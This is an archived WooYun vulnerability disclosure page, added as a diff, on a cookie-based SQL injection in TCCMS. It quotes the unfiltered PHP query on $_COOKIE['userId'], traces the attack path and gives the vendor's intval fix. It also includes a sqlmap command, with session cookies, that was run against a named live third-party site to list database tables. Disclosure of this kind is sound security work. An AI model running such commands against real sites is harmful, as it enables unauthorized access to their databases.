@@ -1,0 +1,255 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		TCCMS全版本COOKIE注入（已演示证明）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		TCCMS全版本COOKIE注入（已演示证明）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/lxj616">lxj616</a> 
+</li><li>提交时间：		2013-11-01 11:06</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-11-01：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-11-01：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-11-04：	细节向第三方安全合作伙伴开放<br/>
+									2013-11-11：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-11-21：	细节向普通白帽子公开<br/>
+									2013-12-11：	细节向实习白帽子公开<br/>
+									2014-01-30：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">TCCMS  teamcen.com  Cookie Injection<br />
+具体请见详细说明<br />
+证明处使用SQLMAP注射成功</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">/public/Class/Authen.class.php<br />
+<br />
+省略无关代码<br />
+<br />
+请注意添加注释处代码，下同<br />
+<br />
+</p><pre><code>public static function checkUserLogin() {<br />
+        $_Obj = M(&quot;user&quot;);<br />
+        if (empty($_COOKIE[&#039;userId&#039;]) || empty($_COOKIE[&#039;AuthenId&#039;])) {return false;}<br />
+        //下面的语句直接使用$_COOKIE[&#039;userId&#039;]没有过滤<br />
+        $sql=&quot;select password from &quot;.$_Obj-&gt;table.&quot; where id=&quot;.$_COOKIE[&#039;userId&#039;];<br />
+        //不考虑之后的代码，如果没有其他限制至少可以盲注<br />
+        $info = $_Obj-&gt;query($sql);<br />
+        if (!empty($_COOKIE[&#039;AuthenId&#039;]) &amp;&amp; md5($info[0][password].Config::get(&quot;anthenKey&quot;)) == $_COOKIE[&#039;AuthenId&#039;]) {<br />
+            return true;<br />
+        }<br />
+        return false;<br />
+    }<br />
+<br />
+//下面函数与之后提到的攻击向量有关<br />
+public static function checkIsSelfData($uid) {<br />
+    	if (self::isAdmin()) {return true;}<br />
+    	if ($uid == $_COOKIE[&#039;userId&#039;] &amp;&amp; self::checkUserLogin()) {return true;}<br />
+    	return false;<br />
+    }</code></pre><p class='detail'><br />
+<br />
+那么我们要定位漏洞代码的触发位置<br />
+<br />
+/core/controller/user.class.php<br />
+<br />
+<br />
+<br />
+攻击向量：<br />
+<br />
+<br />
+<br />
+update()-------------》Authen::checkIsSelfData-------》checkUserLogin()<br />
+<br />
+缺陷参数：userID<br />
+<br />
+<br />
+<br />
+</p><pre><code>public function update() {<br />
+<br />
+		…………省略无关代码…………<br />
+<br />
+		//禁止修改别人的<br />
+		$IsSelfData = Authen::checkIsSelfData($_Obj-&gt;id);<br />
+		if (!$IsSelfData) {<br />
+			$this-&gt;setValue(&quot;error&quot;, Config::lang(&quot;NOTRIGHT&quot;));<br />
+			$this-&gt;forward(&quot;error.html&quot;);<br />
+			exit;<br />
+		}<br />
+		$_Obj-&gt;update();<br />
+		StringUtil::msgbox(Config::lang(&quot;MODIFYSUCCESS&quot;), &#039;index.php?ac=user_info&#039;, 1);<br />
+	}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+即：在更新个人信息时可以直接将cookie中的userID带入数据库查询，形成注射<br />
+<br />
+<br />
+<br />
+下面是利用SQLMAP的证明 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">演示的站点为  lszq.xinwen110.cn<br />
+<br />
+理事会员-中国社会新闻网理事会员-中国社会新闻网 - Power  By TCCMS<br />
+<br />
+本机测试时的命令<br />
+<br />
+</p><pre><code>C:\Users\Administrator.PC-20110802HBAF&gt;sqlmap.py -u &quot;lszq.xinwen110.cn/index.php<br />
+?ac=user_update&quot; --data &quot;abc&quot; --cookie &quot;Cookie=PHPSESSID=0lc04nmbqmmtr420c83n8ov<br />
+3g4; userId=37; AuthenId=2fd1239168e9fabd621a8d00fba03203&quot; --level 2 --table --d<br />
+bms=mysql</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/271658548cdaf2227f01ad60f09dc18db6134bfa.jpg" target="_blank"><img src="../images/271658548cdaf2227f01ad60f09dc18db6134bfa.jpg" alt="tccms_1.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+跑了下数据库，证明即可<br />
+<br />
+</p><p class="detail"><a href="../images/27165920e87fd7e342b5fef8b2a8fc6be6052ff2.jpg" target="_blank"><img src="../images/27165920e87fd7e342b5fef8b2a8fc6be6052ff2.jpg" alt="tccms_2.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注意，请在复现漏洞时将COOKIE换为对应的有效COOKIE（可以注册一个）<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">checkUserLogin() 严格过滤userID </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/lxj616" title="lxj616">lxj616</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-041200" title="TCCMS全版本COOKIE注入（已演示证明）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2013-11-01 13:20</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢乌云感谢lxj616对TCCMS开源产品的检测，已经进行了修复。<br />
+CODE：<br />
+/public/Class/Authen.class.php、<br />
+checkUserLogin();<br />
+intval($_COOKIE[&#039;userId&#039;]);</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="41200";
+var bugRating="-3";
+var myRating="";
+var ratingCount="1";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
